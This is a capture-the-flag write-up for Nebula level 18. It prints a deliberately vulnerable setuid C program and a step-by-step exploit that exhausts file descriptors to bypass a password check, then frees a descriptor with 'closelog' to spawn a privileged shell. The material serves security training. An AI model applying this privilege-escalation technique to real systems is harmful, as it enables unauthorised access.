# Nebula - Level 18

### About ###

>Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.
>
>To do this level, log in as the level18 account with the password level18 . Files for this level can be found in /home/flag18.

### Source code ###

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <getopt.h>

struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;

#define dprintf(...) if(globals.debugfile) \
  fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile && globals.verbose >= num) \
  fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE "/home/flag18/password"

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, "r");
  if(fp) {
    char file[64];

    if(fgets(file, sizeof(file) - 1, fp) == NULL) {
      dprintf("Unable to read password file %s\n", PWFILE);
      return;
    }
                fclose(fp);
    if(strcmp(pw, file) != 0) return;    
  }
  dprintf("logged in successfully (with%s password file)\n", 
    fp == NULL ? "out" : "");
  
  globals.loggedin = 1;

}

void notsupported(char *what)
{
  char *buffer = NULL;
  asprintf(&buffer, "--> [%s] is unsupported at this current time.\n", what);
  dprintf(what);
  free(buffer);
}

void setuser(char *user)
{
  char msg[128];

  sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
  printf("%s\n", msg);

}

int main(int argc, char **argv, char **envp)
{
  char c;

  while((c = getopt(argc, argv, "d:v")) != -1) {
    switch(c) {
      case 'd':
        globals.debugfile = fopen(optarg, "w+");
        if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
        setvbuf(globals.debugfile, NULL, _IONBF, 0);
        break;
      case 'v':
        globals.verbose++;
        break;
    }
  }

  dprintf("Starting up. Verbose level = %d\n", globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());
  
  while(1) {
    char line[256];
    char *p, *q;

    q = fgets(line, sizeof(line)-1, stdin);
    if(q == NULL) break;
    p = strchr(line, '\n'); if(p) *p = 0;
    p = strchr(line, '\r'); if(p) *p = 0;

    dvprintf(2, "got [%s] as input\n", line);

    if(strncmp(line, "login", 5) == 0) {
      dvprintf(3, "attempting to login\n");
      login(line + 6);
    } else if(strncmp(line, "logout", 6) == 0) {
      globals.loggedin = 0;
    } else if(strncmp(line, "shell", 5) == 0) {
      dvprintf(3, "attempting to start shell\n");
      if(globals.loggedin) {
        execve("/bin/sh", argv, envp);
        err(1, "unable to execve");
      }
      dprintf("Permission denied\n");
    } else if(strncmp(line, "logout", 4) == 0) {
      globals.loggedin = 0;
    } else if(strncmp(line, "closelog", 8) == 0) {
      if(globals.debugfile) fclose(globals.debugfile);
      globals.debugfile = NULL;
    } else if(strncmp(line, "site exec", 9) == 0) {
      notsupported(line + 10);
    } else if(strncmp(line, "setuser", 7) == 0) {
      setuser(line + 8);
    }
  }

  return 0;
}
```

### Solution ###

The idea is to set the variable `globals.loggedin` to 1 in order to start a shell.

In the function `login`, it is possible to achieve that if the file pointer `fp` is NULL after the file `/home/flag18/password` is tried to be opened.

A possibility would be to open multiple files in order to reach the maximum open files limit, which is possible since, in the `main` function, in the loop where `getopt` is called, a file is opened for every `-d` found in the arguments passed to the program. When that limit is reached, it becomes impossible for that process to open another file.

It can be verified with the following command.

```
level18@nebula:/home/flag18$ /home/flag18/flag18 /tmp/flag18.sh $(perl -e "print '-d /tmp/misc 'x2000")
flag18: Unable to open /tmp/hellow: Too many open files
```

With some more tests, the error stops appearing when 1021 files are opened and if the command `login` is entered, the file `/tmp/misc` shows that the login was successful without using the password file.

```
level18@nebula:/home/flag18$ /home/flag18/flag18 /tmp/flag18.sh $(perl -e "print '-d /tmp/misc 'x1021")
login
```

```
level18@nebula:/home/flag18$ cat /tmp/stuff
Starting up. Verbose level = 0
logged in successfully (without password file)
```

Although, we can not start a shell just now, because there is an error if we do.

```
level18@nebula:/home/flag18$ /home/flag18/flag18 ./flag18.sh $(perl -e "print '-d /tmp/stuff 'x1021")
login
shell
/home/flag18/flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
```

There are too many file	s opened to do it. That is where the command `closelog` is useful, because it frees a place for another file descriptor.

```
level18@nebula:/home/flag18$ /home/flag18/flag18 ./flag18.sh $(perl -e "print '-d /tmp/stuff 'x1021")
login
closelog
shell
/home/flag18/flag18: -d: invalid option
Usage:	/home/flag18/flag18 [GNU long option] [option] ...
	/home/flag18/flag18 [GNU long option] [option] script-file ...
GNU long options:
	--debug
	--debugger
	--dump-po-strings
	--dump-strings
	--help
	--init-file
	--login
	--noediting
	--noprofile
	--norc
	--posix
	--protected
	--rcfile
	--restricted
	--verbose
	--version
Shell options:
	-irsD or -c command or -O shopt_option		(invocation only)
	-abefhkmnptuvxBCHP or -o option
```

`/bin/sh` does not recognize the option `-d`. What it does recognize though is the option `-debug`.

Finally, `getflag` can be executed with the help of the script `/tmp/flag18.sh`.

```
getflag>/tmp/getflag18
```

```
level18@nebula:/tmp$ /home/flag18/flag18 /tmp/flag18.sh $(perl -e "print '-debug /tmp/stuff 'x1021")
login
closelog
shell
```

```
level18@nebula:/tmp$ cat /tmp/getflag18
You have successfully executed getflag on a target account
```
